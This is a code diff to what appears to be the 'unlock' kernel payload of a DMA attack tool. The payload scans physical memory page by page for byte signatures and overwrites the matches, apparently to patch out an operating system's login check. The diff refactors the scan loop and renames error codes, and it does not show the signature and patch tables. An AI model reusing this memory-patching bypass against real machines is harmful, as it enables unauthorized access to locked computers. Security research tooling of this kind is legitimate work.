@@ -29,25 +29,21 @@ typedef struct tdSignature {
 
 //----------------------------------------------------------------------------------------------------------
 
-BOOL Unlock_FindAndPatch(PKMDDATA pk, PBYTE pbPages, DWORD cPages, PSIGNATURE pSignatures, DWORD cSignatures)
+BOOL Unlock_FindAndPatch(PKMDDATA pk, PBYTE pbPage, PSIGNATURE pSignatures, DWORD cSignatures)
 {
 	BOOL result = FALSE;
-	PBYTE pb;
-	DWORD pgIdx, i;
+	DWORD i;
 	PSIGNATURE ps;
-	for(pgIdx = 0; pgIdx < cPages; pgIdx++) {
-		pb = pbPages + (4096 * pgIdx);
-		for(i = 0; i < cSignatures; i++) {
-			ps = pSignatures + i;
-			if(!ps->chunk[0].cb || SysVCall(pk->fn.memcmp, pb + ps->chunk[0].cbOffset, ps->chunk[0].pb, (QWORD)ps->chunk[0].cb)) {
-				continue;
-			}
-			if(ps->chunk[1].cb && SysVCall(pk->fn.memcmp, pb + ps->chunk[1].cbOffset, ps->chunk[1].pb, (QWORD)ps->chunk[1].cb)) {
-				continue;
-			}
-			SysVCall(pk->fn.memcpy, pb + ps->chunk[2].cbOffset, ps->chunk[2].pb, (QWORD)ps->chunk[2].cb);
-			result = TRUE;
+	for(i = 0; i < cSignatures; i++) {
+		ps = pSignatures + i;
+		if(!ps->chunk[0].cb || SysVCall(pk->fn.memcmp, pbPage + ps->chunk[0].cbOffset, ps->chunk[0].pb, (QWORD)ps->chunk[0].cb)) {
+			continue;
 		}
+		if(ps->chunk[1].cb && SysVCall(pk->fn.memcmp, pbPage + ps->chunk[1].cbOffset, ps->chunk[1].pb, (QWORD)ps->chunk[1].cb)) {
+			continue;
+		}
+		SysVCall(pk->fn.memcpy, pbPage + ps->chunk[2].cbOffset, ps->chunk[2].pb, (QWORD)ps->chunk[2].cb);
+		result = TRUE;
 	}
 	return result;
 }
@@ -63,26 +59,28 @@ STATUS Unlock(PKMDDATA pk)
 		},
 	};
 	PBYTE pbMemoryMap;
-	QWORD cbMemoryMap, qwBaseAddress, qwMemoryAddressMax;
+	QWORD cbMemoryMap, qwBaseAddress, qwMemoryAddressMax, o;
 	BOOL result = FALSE;
 	// 1: Retrieve physical memory map
 	pbMemoryMap = (PBYTE)SysVCall(pk->fn.IOMalloc, 4096);
 	if(!pbMemoryMap) {
-		return STATUS_FAIL_BASE | 2;
+		return STATUS_FAIL_OUTOFMEMORY;
 	}
 	if(!GetMemoryMap(pk, pbMemoryMap, &cbMemoryMap)) {
-		return STATUS_FAIL_BASE | 3;
+		return STATUS_FAIL_MEMORYMAP_NOT_FOUND;
 	}
 	qwMemoryAddressMax = GetMemoryPhysicalMaxAddress(pbMemoryMap, cbMemoryMap);
 	// 2: Search for the memory signature and patch it.
-	for(qwBaseAddress = 0; qwBaseAddress < qwMemoryAddressMax; qwBaseAddress += 0x100000) {
-		if(IsRangeInPhysicalMap(pbMemoryMap, cbMemoryMap, qwBaseAddress, 0x100000)) {
-			MapMemoryPhysical(pk, qwBaseAddress);
-			result = Unlock_FindAndPatch(pk, (PBYTE)VM_MIN_PHYSICALMAPPING_ADDRESS, 0x100, oSigs, NUMBER_OF_SIGNATURES) || result;
+	for(qwBaseAddress = 0; qwBaseAddress < qwMemoryAddressMax; qwBaseAddress += 0x01000000) {
+		MapMemoryPhysical(pk, qwBaseAddress);
+		for(o = 0; o < 0x01000000; o += 0x1000) {
+			if(IsRangeInPhysicalMap(pbMemoryMap, cbMemoryMap, qwBaseAddress + o, 0x1000)) {
+				result = Unlock_FindAndPatch(pk, (PBYTE)(VM_MIN_PHYSICALMAPPING_ADDRESS + o), oSigs, NUMBER_OF_SIGNATURES) || result;
+			}
 		}
 	}
 	SysVCall(pk->fn.IOFree, pbMemoryMap, 4096);
-	return result ? STATUS_SUCCESS : STATUS_FAIL_BASE | 4;
+	return result ? STATUS_SUCCESS : STATUS_FAIL_SIGNATURE_NOT_FOUND;
 }
 
 VOID c_EntryPoint(PKMDDATA pk)
@@ -90,6 +88,6 @@ VOID c_EntryPoint(PKMDDATA pk)
 	if(pk->dataIn[0] == 1) {
 		pk->dataOut[0] = Unlock(pk);
 	} else {
-		pk->dataOut[0] = STATUS_FAIL_BASE | 1;
+		pk->dataOut[0] = STATUS_FAIL_INPPARAMS_BAD;
 	}
 }
